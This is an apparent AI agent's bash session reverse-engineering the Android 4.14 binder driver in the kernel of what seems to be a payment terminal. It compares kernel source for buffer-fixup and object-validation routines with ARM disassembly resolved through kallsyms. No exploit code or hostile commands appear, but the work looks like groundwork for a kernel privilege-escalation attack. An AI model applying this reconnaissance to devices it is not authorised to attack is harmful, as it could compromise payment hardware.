{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && sed -n '/^static void binder_transaction_buffer_release/,/^}/p' 414_binder.c | head -95"}

[tool • bash]
static void binder_transaction_buffer_release(struct binder_proc *proc,
					      struct binder_buffer *buffer,
					      binder_size_t *failed_at)
{
	binder_size_t *offp, *off_start, *off_end;
	int debug_id = buffer->debug_id;

	binder_debug(BINDER_DEBUG_TRANSACTION,
		     "%d buffer release %d, size %zd-%zd, failed at %p\n",
		     proc->pid, buffer->debug_id,
		     buffer->data_size, buffer->offsets_size, failed_at);

	if (buffer->target_node)
		binder_dec_node(buffer->target_node, 1, 0);

	off_start = (binder_size_t *)(buffer->data +
				      ALIGN(buffer->data_size, sizeof(void *)));
	if (failed_at)
		off_end = failed_at;
	else
		off_end = (void *)off_start + buffer->offsets_size;
	for (offp = off_start; offp < off_end; offp++) {
		struct binder_object_header *hdr;
		size_t object_size = binder_validate_object(buffer, *offp);

		if (object_size == 0) {
			pr_err("transaction release %d bad object at offset %lld, size %zd\n",
			       debug_id, (u64)*offp, buffer->data_size);
			continue;
		}
		hdr = (struct binder_object_header *)(buffer->data + *offp);
		switch (hdr->type) {
		case BINDER_TYPE_BINDER:
		case BINDER_TYPE_WEAK_BINDER: {
			struct flat_binder_object *fp;
			struct binder_node *node;

			fp = to_flat_binder_object(hdr);
			node = binder_get_node(proc, fp->binder);
			if (node == NULL) {
				pr_err("transaction release %d bad node %016llx\n",
				       debug_id, (u64)fp->binder);
				break;
			}
			binder_debug(BINDER_DEBUG_TRANSACTION,
				     "        node %d u%016llx\n",
				     node->debug_id, (u64)node->ptr);
			binder_dec_node(node, hdr->type == BINDER_TYPE_BINDER,
					0);
			binder_put_node(node);
		} break;
		case BINDER_TYPE_HANDLE:
		case BINDER_TYPE_WEAK_HANDLE: {
			struct flat_binder_object *fp;
			struct binder_ref_data rdata;
			int ret;

			fp = to_flat_binder_object(hdr);
			ret = binder_dec_ref_for_handle(proc, fp->handle,
				hdr->type == BINDER_TYPE_HANDLE, &rdata);

			if (ret) {
				pr_err("transaction release %d bad handle %d, ret = %d\n",
				 debug_id, fp->handle, ret);
				break;
			}
			binder_debug(BINDER_DEBUG_TRANSACTION,
				     "        ref %d desc %d\n",
				     rdata.debug_id, rdata.desc);
		} break;

		case BINDER_TYPE_FD: {
			struct binder_fd_object *fp = to_binder_fd_object(hdr);

			binder_debug(BINDER_DEBUG_TRANSACTION,
				     "        fd %d\n", fp->fd);
			if (failed_at)
				task_close_fd(proc, fp->fd);
		} break;
		case BINDER_TYPE_PTR:
			/*
			 * Nothing to do here, this will get cleaned up when the
			 * transaction buffer gets freed
			 */
			break;
		case BINDER_TYPE_FDA: {
			struct binder_fd_array_object *fda;
			struct binder_buffer_object *parent;
			uintptr_t parent_buffer;
			u32 *fd_array;
			size_t fd_index;
			binder_size_t fd_buf_size;

			fda = to_binder_fd_array_object(hdr);
			parent = binder_validate_ptr(buffer, fda->parent,


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && sed -n '/static bool binder_validate_fixup/,/^}/p' 414_binder.c; echo ===FIXUP===; sed -n '/static void binder_fixup_parent/,/^}/p' 414_binder.c"}

[tool • bash]
static bool binder_validate_fixup(struct binder_buffer *b,
				  binder_size_t *objects_start,
				  struct binder_buffer_object *buffer,
				  binder_size_t fixup_offset,
				  struct binder_buffer_object *last_obj,
				  binder_size_t last_min_offset)
{
	if (!last_obj) {
		/* Nothing to fix up in */
		return false;
	}

	while (last_obj != buffer) {
		/*
		 * Safe to retrieve the parent of last_obj, since it
		 * was already previously verified by the driver.
		 */
		if ((last_obj->flags & BINDER_BUFFER_FLAG_HAS_PARENT) == 0)
			return false;
		last_min_offset = last_obj->parent_offset + sizeof(uintptr_t);
		last_obj = (struct binder_buffer_object *)
			(b->data + *(objects_start + last_obj->parent));
	}
	return (fixup_offset >= last_min_offset);
}
===FIXUP===


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && grep -n \"binder_fixup_parent\\|binder_validate_ptr\\|binder_get_object\\b\" 414_binder.c | head; sed -n '/^static struct binder_buffer_object \\*binder_validate_ptr/,/^}/p' 414_binder.c; sed -n '/object_offset = bp->parent_offset/,/sizeof(bp->buffer)/p' 414_binder.c | head -12"}

[tool • bash]
1998: * binder_validate_ptr() - validates binder_buffer_object in a binder_buffer.
2014:static struct binder_buffer_object *binder_validate_ptr(struct binder_buffer *b,
2191:			parent = binder_validate_ptr(buffer, fda->parent,
2470:static int binder_fixup_parent(struct binder_transaction *t,
2487:	parent = binder_validate_ptr(b, bp->parent, off_start, num_valid);
2985:				binder_validate_ptr(t->buffer, fda->parent,
3048:			ret = binder_fixup_parent(t, thread, bp, off_start,
static struct binder_buffer_object *binder_validate_ptr(struct binder_buffer *b,
							binder_size_t index,
							binder_size_t *start,
							binder_size_t num_valid)
{
	struct binder_buffer_object *buffer_obj;
	binder_size_t *offp;

	if (index >= num_valid)
		return NULL;

	offp = start + index;
	buffer_obj = (struct binder_buffer_object *)(b->data + *offp);
	if (buffer_obj->hdr.type != BINDER_TYPE_PTR)
		return NULL;

	return buffer_obj;
}


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && sed -n '2470,2500p' 414_binder.c; grep -n \"num_valid\\b\" 414_binder.c | head -12; grep -n \"failed_at\\|binder_validate_object\" 414_binder.c | head -12"}

[tool • bash]
static int binder_fixup_parent(struct binder_transaction *t,
			       struct binder_thread *thread,
			       struct binder_buffer_object *bp,
			       binder_size_t *off_start,
			       binder_size_t num_valid,
			       struct binder_buffer_object *last_fixup_obj,
			       binder_size_t last_fixup_min_off)
{
	struct binder_buffer_object *parent;
	u8 *parent_buffer;
	struct binder_buffer *b = t->buffer;
	struct binder_proc *proc = thread->proc;
	struct binder_proc *target_proc = t->to_proc;

	if (!(bp->flags & BINDER_BUFFER_FLAG_HAS_PARENT))
		return 0;

	parent = binder_validate_ptr(b, bp->parent, off_start, num_valid);
	if (!parent) {
		binder_user_error("%d:%d got transaction with invalid parent offset or type\n",
				  proc->pid, thread->pid);
		return -EINVAL;
	}

	if (!binder_validate_fixup(b, off_start,
				   parent, bp->parent_offset,
				   last_fixup_obj,
				   last_fixup_min_off)) {
		binder_user_error("%d:%d got transaction with out-of-order buffer fixup\n",
				  proc->pid, thread->pid);
		return -EINVAL;
2003: * @num_valid:	the number of valid offsets in the offset array
2006: *		described by @start and @num_valid, and if there's a valid
2011: *		verified; this function assumes that @num_valid elements
2017:							binder_size_t num_valid)
2022:	if (index >= num_valid)
2474:			       binder_size_t num_valid,
2487:	parent = binder_validate_ptr(b, bp->parent, off_start, num_valid);
1951: * binder_validate_object() - checks for a valid metadata object in a buffer.
1958:static size_t binder_validate_object(struct binder_buffer *buffer, u64 offset)
2099:					      binder_size_t *failed_at)
2107:		     buffer->data_size, buffer->offsets_size, failed_at);
2114:	if (failed_at)
2115:		off_end = failed_at;
2120:		size_t object_size = binder_validate_object(buffer, *offp);
2173:			if (failed_at)
2924:		size_t object_size = binder_validate_object(t->buffer, *offp);


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && curl -sL \"https://raw.githubusercontent.com/aosp-mirror/kernel_common/android-4.14/drivers/android/binder.c\" -o aosp414.c; wc -c aosp414.c; grep -n \"binder_validate_ptr\" aosp414.c | head -3"}

[tool • bash]
14 aosp414.c


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && for r in \"aosp-mirror/kernel_common/android-4.14-o-mr1\" \"LineageOS/android_kernel_oneplus_sm8150/lineage-19.1/drivers/android\" \"AOSP-4.14/android_kernel_common/android-4.14\"; do echo \"== $r\"; curl -sL \"https://raw.githubusercontent.com/$r/drivers/android/binder.c\" 2>/dev/null | head -c 60; echo; done; echo \"== try gitiles android-4.14-o-mr1 ==\"; curl -sL \"https://android.googlesource.com/kernel/common/+/refs/tags/android-4.14-o-mr1/drivers/android/binder.c?format=TEXT\" | base64 -d 2>/dev/null | head -c 80; echo"}

[tool • bash]
== aosp-mirror/kernel_common/android-4.14-o-mr1
404: Not Found
== LineageOS/android_kernel_oneplus_sm8150/lineage-19.1/drivers/android
404: Not Found
== AOSP-4.14/android_kernel_common/android-4.14
404: Not Found
== try gitiles android-4.14-o-mr1 ==
4�


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && curl -s \"https://android.googlesource.com/kernel/common/+/refs/heads/android-4.14/drivers/android/binder.c?format=TEXT\" | head -c 200 | od -c | head -4"}

[tool • bash]
0000000   N   O   T   _   F   O   U   N   D   :       R   e   q   u   e
0000020   s   t   e   d       e   n   t   i   t   y       w   a   s    
0000040   n   o   t       f   o   u   n   d  \n   [   t   y   p   e   .
0000060   g   o   o   g   l   e   a   p   i   s   .   c   o   m   /   g


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && cat tmp/m3/dis2_binder_new_node.txt 2>/dev/null | head -80"}

[tool • bash]
(no output)

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && ls tmp/m3/dis2_binder* | head; grep -E \" (t|T) binder_new_node \" tmp/m3/kallsyms_root.txt"}

[tool • bash]
tmp/m3/dis2_binder_dec_node_nilocked.txt
tmp/m3/dis2_binder_fixup_parent.txt
tmp/m3/dis2_binder_get_object.txt
tmp/m3/dis2_binder_transaction_buffer_release.txt
tmp/m3/dis2_binder_transaction.txt
tmp/m3/dis2_binder_translate_binder.txt
tmp/m3/dis2_binder_validate_fixup.txt
tmp/m3/dis2_binder_validate_ptr.txt


Command exited with code 1

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && grep -iE \"binder_new_node|new_node\" tmp/m3/kallsyms_root.txt | head -5; echo \"=== fixup_parent disasm head ===\"; head -50 tmp/m3/dis2_binder_fixup_parent.txt"}

[tool • bash]
c033678c t __kernfs_new_node
c0337c5c T kernfs_new_node
c041d788 T f2fs_new_node_page
c088293c t binder_new_node
bf0e8de4 t isp_coeff_get_new_node	[sprd_camera]
=== fixup_parent disasm head ===
c0884a14  mov	ip, sp
c0884a18  push	{r4, r5, r6, r7, r8, r9, sl, fp, ip, lr, pc}
c0884a1c  sub	fp, ip, #4
c0884a20  sub	sp, sp, #164	@ 0xa4
c0884a24  push	{lr}		@ (str lr, [sp, #-4]!)
c0884a28  bl	0xc0110884
c0884a2c  ldr	r3, [pc, #516]	@ 0xc0884c38
c0884a30  mov	r7, r1
c0884a34  ldr	r5, [r0, #40]	@ 0x28
c0884a38  mov	r4, r2
c0884a3c  ldr	r6, [r0, #24]
c0884a40  ldr	r0, [r2, #4]
c0884a44  ldr	r3, [r3]
c0884a48  ands	r0, r0, #1
c0884a4c  ldr	sl, [fp, #4]
c0884a50  ldr	r1, [fp, #8]
c0884a54  str	r3, [fp, #-48]	@ 0xffffffd0
c0884a58  ldr	r8, [r7]
c0884a5c  beq	0xc0884c18
c0884a60  ldrd	r2, [r2, #24]
c0884a64  mov	r0, r6
c0884a68  str	r1, [sp, #12]
c0884a6c  mov	r1, r5
c0884a70  str	sl, [sp, #8]
c0884a74  strd	r2, [sp]
c0884a78  sub	r3, fp, #148	@ 0x94
c0884a7c  str	r3, [sp, #16]
c0884a80  ldrd	r2, [fp, #12]
c0884a84  strd	r2, [sp, #24]
c0884a88  sub	r2, fp, #132	@ 0x84
c0884a8c  bl	0xc087e240
c0884a90  subs	r9, r0, #0
c0884a94  bne	0xc0884ad8
c0884a98  ldr	r3, [pc, #412]	@ 0xc0884c3c
c0884a9c  ldr	r3, [r3]
c0884aa0  tst	r3, #1
c0884aa4  beq	0xc0884ab8
c0884aa8  ldr	r0, [pc, #400]	@ 0xc0884c40
c0884aac  ldr	r1, [r8, #32]
c0884ab0  ldr	r2, [r7, #24]
c0884ab4  bl	0xc018ede0
c0884ab8  ldr	r3, [pc, #388]	@ 0xc0884c44
c0884abc  mvn	r0, #21
c0884ac0  ldr	r3, [r3, #216]	@ 0xd8
c0884ac4  cmp	r3, #0
c0884ac8  ldrne	r3, [pc, #372]	@ 0xc0884c44
c0884acc  movne	r2, #2
c0884ad0  strne	r2, [r3, #216]	@ 0xd8
c0884ad4  b	0xc0884c18
c0884ad8  ldrd	r2, [fp, #-148]	@ 0xffffff6c


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && sed -n '/^c0884ad8  ldrd/,/^c0884b40/p' tmp/m3/dis2_binder_fixup_parent.txt; echo \"=== copy_to + validate_fixup calls ===\"; grep -n \"bl\\s0xc088b400\\|bl\\s0xc087e318\\|user_data\" tmp/m3/dis2_binder_fixup_parent.txt | head"}

[tool • bash]
c0884ad8  ldrd	r2, [fp, #-148]	@ 0xffffff6c
c0884adc  strd	r2, [fp, #-156]	@ 0xffffff64
c0884ae0  ldrd	r2, [r4, #32]
c0884ae4  strd	r2, [fp, #-164]	@ 0xffffff5c
c0884ae8  ldrd	r2, [fp, #20]
c0884aec  strd	r2, [fp, #-140]	@ 0xffffff74
c0884af0  orrs	r3, r2, r3
c0884af4  addne	r3, r6, #328	@ 0x148
c0884af8  strne	r3, [fp, #-168]	@ 0xffffff58
c0884afc  beq	0xc0884b88
c0884b00  ldrd	r2, [fp, #-140]	@ 0xffffff74
c0884b04  ldrd	r0, [fp, #-156]	@ 0xffffff64
c0884b08  cmp	r3, r1
c0884b0c  cmpeq	r2, r0
c0884b10  beq	0xc0884b74
c0884b14  mov	r0, r6
c0884b18  mov	r1, r5
c0884b1c  sub	r3, fp, #92	@ 0x5c
c0884b20  bl	0xc087e110
c0884b24  cmp	r0, #40	@ 0x28
c0884b28  bne	0xc0884b88
c0884b2c  ldr	r3, [fp, #-88]	@ 0xffffffa8
c0884b30  tst	r3, #1
c0884b34  beq	0xc0884b88
c0884b38  ldrd	r2, [fp, #-60]	@ 0xffffffc4
c0884b3c  adds	r0, r2, #4
c0884b40  mov	r2, #0
=== copy_to + validate_fixup calls ===
128:c0884c10  bl	0xc088b400


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && sed -n '/^c0884b40/,/^c0884c14/p' tmp/m3/dis2_binder_fixup_parent.txt"}

[tool • bash]
c0884b40  mov	r2, #0
c0884b44  adc	r1, r3, #0
c0884b48  ldr	r3, [fp, #-68]	@ 0xffffffbc
c0884b4c  strd	r0, [fp, #28]
c0884b50  sub	r1, fp, #140	@ 0x8c
c0884b54  ldr	r0, [fp, #-168]	@ 0xffffff58
c0884b58  add	r3, sl, r3, lsl #3
c0884b5c  str	r3, [sp]
c0884b60  mov	r3, #8
c0884b64  stmib	sp, {r2, r3}
c0884b68  mov	r2, r5
c0884b6c  bl	0xc088b444
c0884b70  b	0xc0884b00
c0884b74  ldrd	r2, [fp, #-164]	@ 0xffffff5c
c0884b78  ldrd	r0, [fp, #28]
c0884b7c  cmp	r3, r1
c0884b80  cmpeq	r2, r0
c0884b84  bcs	0xc0884ba0
c0884b88  ldr	r3, [pc, #172]	@ 0xc0884c3c
c0884b8c  ldr	r3, [r3]
c0884b90  tst	r3, #1
c0884b94  ldrne	r0, [pc, #172]	@ 0xc0884c48
c0884b98  beq	0xc0884ab8
c0884b9c  b	0xc0884aac
c0884ba0  ldrd	r0, [r9, #16]
c0884ba4  cmp	r1, #0
c0884ba8  cmpeq	r0, #7
c0884bac  bls	0xc0884bc8
c0884bb0  subs	r0, r0, #8
c0884bb4  ldrd	r2, [r4, #32]
c0884bb8  sbc	r1, r1, #0
c0884bbc  cmp	r3, r1
c0884bc0  cmpeq	r2, r0
c0884bc4  bls	0xc0884be0
c0884bc8  ldr	r3, [pc, #108]	@ 0xc0884c3c
c0884bcc  ldr	r3, [r3]
c0884bd0  tst	r3, #1
c0884bd4  ldrne	r0, [pc, #112]	@ 0xc0884c4c
c0884bd8  beq	0xc0884ab8
c0884bdc  b	0xc0884aac
c0884be0  ldr	r1, [r9, #8]
c0884be4  add	r0, r6, #328	@ 0x148
c0884be8  ldr	ip, [r5, #44]	@ 0x2c
c0884bec  add	r4, r4, #8
c0884bf0  adds	r2, r2, r1
c0884bf4  str	r4, [sp]
c0884bf8  adc	r3, r3, #0
c0884bfc  subs	r2, r2, ip
c0884c00  mov	r1, #8
c0884c04  sbc	r3, r3, #0
c0884c08  str	r1, [sp, #4]
c0884c0c  mov	r1, r5
c0884c10  bl	0xc088b400
c0884c14  mov	r0, #0


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && python3 - <<'PYEOF'\nimport subprocess,bisect,re\nKS='tmp/m3/kallsyms_root.txt'; IMG='tmp/m3/zImage.bin'; BASE=0xc0008000\nsyms={}; addrs=[]\nfor ln in open(KS,errors='ignore'):\n    p=ln.split()\n    if len(p)>=3 and len(p[0])==8 and p[0].startswith(('c0','c1')):\n        try: va=int(p[0],16); syms[p[2]]=va; addrs.append(va)\n        except: pass\naddrs.sort()\ndef endof(va):\n    i=bisect.bisect_right(addrs,va)\n    return addrs[i] if i<len(addrs) and addrs[i]>va else va+0x800\ndata=open(IMG,'rb').read()\nlines=[]\nfor fn in ['binder_new_node','binder_inc_ref_for_node','binder_get_node','binder_translate_fd']:\n    va=syms.get(fn)\n    if va is None: print('MISSING',fn); continue\n    end=min(endof(va),va+0x1800); off=va-BASE\n    open('tmp/m3/slc_%s.bin'%fn,'wb').write(data[off:off+(end-va)])\n    out=subprocess.run(['arm-none-eabi-objdump','-D','-b','binary','-marm','--adjust-vma=%#x'%va,'tmp/m3/slc_%s.bin'%fn],capture_output=True,text=True).stdout\n    ls=[]\n    for l in out.splitlines():\n        m=re.match(r'^([0-9a-f]{8}):\\s+([0-9a-f ]{8})\\s*(.*)',l)\n        if m: ls.append((int(m.group(1),16),m.group(3).strip()))\n    open('tmp/m3/dis2_%s.txt'%fn,'w').write('\\n'.join('%08x  %s'%(a,l) for a,l in ls))\n    print('===',fn,hex(va),len(ls),'insns; calls:')\n    for a,l in ls:\n        m2=re.search(r'bl\\s+0x([0-9a-f]+)',l)\n        if m2:\n            tv=int(m2.group(1),16); nm=[k for k,v in syms.items() if v==tv]\n            print('  %08x %s -> %s'%(a,l,nm[0] if nm else '?'))\nPYEOF"}

[tool • bash]
=== binder_new_node 0xc088293c 156 insns; calls:
  c0882950 bl	0xc0110884 -> __gnu_mcount_nc
  c088296c bl	0xc02a4d2c -> kmem_cache_alloc_trace
  c0882980 bl	0xc087d4ac -> _binder_inner_proc_lock
  c0882a68 bl	0xc0af35a0 -> rb_insert_color
  c0882b5c bl	0xc018ede0 -> printk
  c0882b6c bl	0xc087d560 -> _binder_inner_proc_unlock
  c0882b7c bl	0xc02a63c4 -> kfree
=== binder_inc_ref_for_node 0xc0881904 174 insns; calls:
  c0881918 bl	0xc0110884 -> __gnu_mcount_nc
  c0881930 bl	0xc087d36c -> _binder_proc_lock
  c0881974 bl	0xc087d45c -> _binder_proc_unlock
  c0881988 bl	0xc02a4d2c -> kmem_cache_alloc_trace
  c088199c bl	0xc087d36c -> _binder_proc_lock
  c0881a48 bl	0xc0af35a0 -> rb_insert_color
  c0881a68 bl	0xc0af33e4 -> rb_first
  c0881a8c bl	0xc0af3988 -> rb_next
  c0881ae4 bl	0xc0af35a0 -> rb_insert_color
  c0881af0 bl	0xc087d3bc -> _binder_node_lock
  c0881b38 bl	0xc018ede0 -> printk
  c0881b44 bl	0xc087d40c -> _binder_node_unlock
  c0881b58 bl	0xc0881820 -> binder_inc_ref_olocked
  c0881b74 bl	0xc087d45c -> _binder_proc_unlock
  c0881b88 bl	0xc02a63c4 -> kfree
MISSING binder_get_node
=== binder_translate_fd 0xc0881468 189 insns; calls:
  c088147c bl	0xc0110884 -> __gnu_mcount_nc
  c08814f8 bl	0xc018ede0 -> printk
  c0881518 bl	0xc02da200 -> fget
  c0881544 bl	0xc018ede0 -> printk
  c0881570 bl	0xc044506c -> security_binder_transfer_file
  c0881584 bl	0xc0b040cc -> mutex_lock
  c08815a0 bl	0xc013c1e4 -> __lock_task_sighand
  c08815cc bl	0xc0b06fe0 -> _raw_spin_unlock_irqrestore
  c08815e0 bl	0xc02da798 -> __alloc_fd
  c08815ec bl	0xc0b02fc4 -> mutex_unlock
  c08815fc bl	0xc0b040cc -> mutex_lock
  c0881614 bl	0xc02da978 -> __fd_install
  c088161c bl	0xc0b02fc4 -> mutex_unlock
  c08816d8 bl	0xc0b01d88 -> preempt_schedule_notrace
  c08816f8 bl	0xc018ede0 -> printk
  c0881710 bl	0xc02bbdcc -> fput
  c0881728 bl	0xc012b218 -> __stack_chk_fail


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && head -60 tmp/m3/dis2_binder_new_node.txt"}

[tool • bash]
c088293c  mov	ip, sp
c0882940  push	{r4, r5, r6, r7, r8, r9, sl, fp, ip, lr, pc}
c0882944  sub	fp, ip, #4
c0882948  sub	sp, sp, #36	@ 0x24
c088294c  push	{lr}		@ (str lr, [sp, #-4]!)
c0882950  bl	0xc0110884
c0882954  ldr	r3, [pc, #568]	@ 0xc0882b94
c0882958  mov	r5, r1
c088295c  str	r0, [fp, #-56]	@ 0xffffffc8
c0882960  mov	r2, #88	@ 0x58
c0882964  ldr	r1, [pc, #556]	@ 0xc0882b98
c0882968  ldr	r0, [r3, #28]
c088296c  bl	0xc02a4d2c
c0882970  subs	r4, r0, #0
c0882974  beq	0xc0882b84
c0882978  ldr	r0, [fp, #-56]	@ 0xffffffc8
c088297c  movw	r1, #1406	@ 0x57e
c0882980  bl	0xc087d4ac
c0882984  ldr	r3, [fp, #-56]	@ 0xffffffc8
c0882988  cmp	r5, #0
c088298c  add	ip, r3, #12
c0882990  beq	0xc08829ac
c0882994  ldrd	r2, [r5, #8]
c0882998  ldr	r9, [r5, #16]
c088299c  ldr	r8, [r5, #20]
c08829a0  strd	r2, [fp, #-52]	@ 0xffffffcc
c08829a4  ldr	r5, [r5, #4]
c08829a8  b	0xc08829bc
c08829ac  mov	r9, #0
c08829b0  str	r9, [fp, #-52]	@ 0xffffffcc
c08829b4  mov	r8, r9
c08829b8  str	r9, [fp, #-48]	@ 0xffffffd0
c08829bc  ldr	r3, [fp, #-56]	@ 0xffffffc8
c08829c0  ldr	r3, [r3, #404]	@ 0x194
c08829c4  uxth	r2, r3
c08829c8  cmp	r2, r3, lsr #16
c08829cc  movne	r2, ip
c08829d0  movne	r1, #0
c08829d4  bne	0xc08829f8
c08829d8  udf	#18
c08829dc  ldrd	r0, [r3, #36]	@ 0x24
c08829e0  ldrd	r6, [fp, #-52]	@ 0xffffffcc
c08829e4  cmp	r7, r1
c08829e8  cmpeq	r6, r0
c08829ec  addcc	r2, r3, #8
c08829f0  bcs	0xc0882a08
c08829f4  mov	r1, r3
c08829f8  ldr	r3, [r2]
c08829fc  cmp	r3, #0
c0882a00  bne	0xc08829dc
c0882a04  b	0xc0882a24
c0882a08  addhi	r2, r3, #4
c0882a0c  bhi	0xc08829f4
c0882a10  ldr	r2, [r3, #32]
c0882a14  sub	r5, r3, #20
c0882a18  add	r2, r2, #1
c0882a1c  str	r2, [r3, #32]
c0882a20  b	0xc0882b64
c0882a24  ldr	r6, [pc, #368]	@ 0xc0882b9c
c0882a28  add	r0, r6, #156	@ 0x9c


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && sed -n '/^c0882a30/,/^c0882a68/p' tmp/m3/dis2_binder_new_node.txt"}

[tool • bash]
c0882a30  ldrex	r14, [r0]
c0882a34  add	lr, lr, #1
c0882a38  strex	sl, lr, [r0]
c0882a3c  teq	sl, #0
c0882a40  bne	0xc0882a30
c0882a44  ldr	r0, [r4, #52]	@ 0x34
c0882a48  str	r1, [r4, #20]
c0882a4c  mov	r1, ip
c0882a50  str	r3, [r4, #24]
c0882a54  add	r0, r0, #1
c0882a58  str	r3, [r4, #28]
c0882a5c  str	r0, [r4, #52]	@ 0x34
c0882a60  add	r0, r4, #20
c0882a64  str	r0, [r2]
c0882a68  bl	0xc0af35a0


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && sed -n '/^c0882a70/,/^c0882b64/p' tmp/m3/dis2_binder_new_node.txt"}

[tool • bash]
c0882a70  ldr	r2, [pc, #296]	@ 0xc0882ba0
c0882a74  pldw	[r2]
c0882a78  ldrex	r3, [r2]
c0882a7c  add	r3, r3, #1
c0882a80  strex	r1, r3, [r2]
c0882a84  teq	r1, #0
c0882a88  bne	0xc0882a78
c0882a8c  dmb	ish
c0882a90  ldr	r2, [fp, #-56]	@ 0xffffffc8
c0882a94  ldrd	r0, [fp, #-52]	@ 0xffffffcc
c0882a98  str	r3, [r4]
c0882a9c  str	r2, [r4, #32]
c0882aa0  mov	r2, #4
c0882aa4  str	r2, [r4, #16]
c0882aa8  ldrb	r2, [r4, #73]	@ 0x49
c0882aac  strd	r0, [r4, #56]	@ 0x38
c0882ab0  ubfx	r1, r5, #9, #2
c0882ab4  cmp	r1, #0
c0882ab8  cmpne	r1, #3
c0882abc  bfi	r2, r1, #0, #2
c0882ac0  strb	r2, [r4, #73]	@ 0x49
c0882ac4  sxtb	r2, r5
c0882ac8  addeq	r2, r2, #120	@ 0x78
c0882acc  rsbne	r2, r2, #99	@ 0x63
c0882ad0  strb	r2, [r4, #74]	@ 0x4a
c0882ad4  ubfx	r1, r5, #8, #1
c0882ad8  ldrb	r2, [r4, #73]	@ 0x49
c0882adc  str	r9, [r4, #64]	@ 0x40
c0882ae0  bfi	r2, r1, #3, #1
c0882ae4  ubfx	r1, r5, #11, #1
c0882ae8  bfi	r2, r1, #2, #1
c0882aec  ubfx	r5, r5, #12, #1
c0882af0  bfi	r2, r5, #4, #1
c0882af4  strb	r2, [r4, #73]	@ 0x49
c0882af8  mov	r2, #0
c0882afc  str	r2, [r4, #4]
c0882b00  add	r2, r4, #8
c0882b04  str	r2, [r4, #8]
c0882b08  str	r2, [r4, #12]
c0882b0c  add	r2, r4, #76	@ 0x4c
c0882b10  str	r2, [r4, #76]	@ 0x4c
c0882b14  str	r2, [r4, #80]	@ 0x50
c0882b18  ldr	r2, [pc, #132]	@ 0xc0882ba4
c0882b1c  str	r8, [r4, #68]	@ 0x44
c0882b20  ldr	r2, [r2]
c0882b24  tst	r2, #4096	@ 0x1000
c0882b28  beq	0xc0882b60
c0882b2c  mov	r2, sp
c0882b30  bic	r1, r2, #8128	@ 0x1fc0
c0882b34  bic	r1, r1, #63	@ 0x3f
c0882b38  ldr	r2, [fp, #-56]	@ 0xffffffc8
c0882b3c  ldr	ip, [r1, #12]
c0882b40  ldrd	r0, [fp, #-52]	@ 0xffffffcc
c0882b44  str	r9, [sp, #8]
c0882b48  str	r8, [sp, #12]
c0882b4c  strd	r0, [sp]
c0882b50  ldr	r0, [pc, #80]	@ 0xc0882ba8
c0882b54  ldr	r1, [r2, #32]
c0882b58  ldr	r2, [ip, #1008]	@ 0x3f0
c0882b5c  bl	0xc018ede0
c0882b60  mov	r5, r4
c0882b64  ldr	r0, [fp, #-56]	@ 0xffffffc8


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && sed -n '/^struct binder_ref {$/,/^};/p' 414_binder.c; grep -n \"binder_get_node(\" 414_binder.c | head -3; sed -n '/^static struct binder_node \\*binder_get_node(/,/^}/p' 414_binder.c"}

[tool • bash]
struct binder_ref {
	/* Lookups needed: */
	/*   node + proc => ref (transaction) */
	/*   desc + proc => ref (transaction, inc/dec ref) */
	/*   node => refs + procs (proc exit) */
	struct binder_ref_data data;
	struct rb_node rb_node_desc;
	struct rb_node rb_node_node;
	struct hlist_node node_entry;
	struct binder_proc *proc;
	struct binder_node *node;
	struct binder_ref_death *death;
};
1100:static struct binder_node *binder_get_node(struct binder_proc *proc,
2135:			node = binder_get_node(proc, fp->binder);
2242:	node = binder_get_node(proc, fp->binder);
static struct binder_node *binder_get_node(struct binder_proc *proc,
					   binder_uintptr_t ptr)
{
	struct binder_node *node;

	binder_inner_proc_lock(proc);
	node = binder_get_node_ilocked(proc, ptr);
	binder_inner_proc_unlock(proc);
	return node;
}


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && sed -n '/^struct binder_proc {$/,/^};/p' 414_binder.c | grep -nE \"nodes|refs_by|todo|wait|threads|proc_node|pid|default_\" ; echo ===; sed -n '/^struct binder_proc {$/,/^};/p' 414_binder.c | grep -c .; grep -n \"static struct binder_node \\*binder_get_node_ilocked\" 414_binder.c && sed -n '/^static struct binder_node \\*binder_get_node_ilocked/,/^}/p' 414_binder.c | head -30"}

[tool • bash]
2:	struct hlist_node proc_node;
3:	struct rb_root threads;
4:	struct rb_root nodes;
5:	struct rb_root refs_by_desc;
6:	struct rb_root refs_by_node;
7:	struct list_head waiting_threads;
8:	int pid;
15:	struct list_head todo;
16:	wait_queue_head_t wait;
19:	int max_threads;
20:	int requested_threads;
21:	int requested_threads_started;
23:	long default_priority;
===
